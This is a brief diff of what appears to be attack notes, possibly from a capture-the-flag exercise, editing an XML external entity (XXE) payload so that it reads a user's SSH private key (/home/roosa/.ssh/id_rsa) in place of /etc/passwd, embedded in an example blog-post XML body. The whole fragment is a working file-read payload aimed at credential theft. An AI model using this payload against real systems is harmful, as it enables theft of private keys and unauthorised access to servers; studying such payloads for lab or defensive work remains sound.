@@ -45,9 +45,10 @@ make_table()
 
 # XXE file read:
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+<!DOCTYPE replace [<!ENTITY test SYSTEM 'file:///home/roosa/.ssh/id_rsa'>]>
 <post>
     <title>Example Post</title>
     <description>&test;></description>
     <markdown>Example Markdown></markdown>
 </post>
+
